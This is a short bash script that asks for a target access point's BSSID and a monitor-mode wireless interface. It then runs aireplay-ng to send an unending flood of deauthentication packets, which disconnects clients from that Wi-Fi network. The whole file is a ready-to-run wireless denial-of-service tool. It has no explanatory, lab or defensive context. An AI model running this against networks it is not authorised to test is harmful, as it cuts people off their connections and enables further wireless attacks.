#!/bin/bash

read -p "Enter target BSSID: " bssid
read -p "Enter target interface (e.g. wlan0mon): " iface

echo "[*] Sending deauth packets..."
aireplay-ng --deauth 0 -a $bssid $iface

